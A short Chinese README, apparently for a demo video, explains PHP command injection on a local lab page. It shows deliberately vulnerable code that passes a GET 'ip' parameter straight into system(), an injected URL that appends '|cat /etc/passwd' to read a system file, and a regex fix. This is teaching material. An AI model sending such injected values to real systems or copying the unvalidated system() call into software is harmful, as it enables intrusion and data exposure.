# 说明
2023-1-4 1-16-51.mp4视频演示了如何通过php简单的实现执行任意命令,以下是漏洞说明

视频中演示的index.php的代码为
```php
<?php
$ip = $_GET['ip'];
$result = system("ping -c 4 $ip");
echo $result;
?>
```
可以看到执行了system函数,system函数的作用是调用系统指令,是危险函数,需要验证输入的内容是否为合法内容,但是显然这里并没有验证合法内容,就可以进行简单的执行

```http://127.0.0.1/CommandExcuteExploit/index.php?ip=127.0.0.1```
这是正常的url

```http://127.0.0.1/CommandExcuteExploit/index.php?ip=127.0.0.1|cat /etc/passwd```
显然这是一个含有恶意请求的url,多一条执行命令就是cat指令,原理就和在bash终端中执行指令一样,正常的url执行的语句是这样
```ping -c 4 127.0.0.1```

但是恶意请求的url是这样
```ping -c 4 127.0.0.1| cat /etc/passwd```

说明完毕,漏洞的修补是这样,很简单只需要添加正则表达式过滤即可
```php
<?php
$ip = $_GET['ip'];
if (preg_match('/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/', $ip)) {
    $result = system("ping -c 4 $ip");
    echo $result;
} else {
    echo "Invalid IP address(无效的IP地址)";
}
?>
```
> 不过不可以输入域名了,因为这里正则表达式只允许IP地址规格的输入.
>好了这就是执行任意命令的演示了
